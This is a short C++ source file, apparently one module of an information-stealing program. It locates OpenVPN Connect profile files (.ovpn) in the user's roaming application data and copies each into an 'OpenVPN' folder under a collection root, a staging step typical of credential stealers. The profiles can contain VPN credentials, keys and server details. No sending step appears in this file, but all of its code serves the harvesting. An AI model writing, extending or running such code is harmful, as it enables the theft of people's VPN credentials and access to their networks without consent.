//
// Created by .1qxz on 08.06.2024.
//

#include "OpenVPN.h"

static const fs::path OPENVPN_PROFILES_PATH = Utils::getRoamingPath() / "OpenVPN Connect" / "profiles";

void OpenVPN::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(OPENVPN_PROFILES_PATH, [](const fs::path &path) {
        std::string extension = path.extension().string();
        extension.erase(0, 1);

        return extension == "ovpn";
    });

    if(paths.empty())
        return;

    fs::path dst = root / "OpenVPN";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}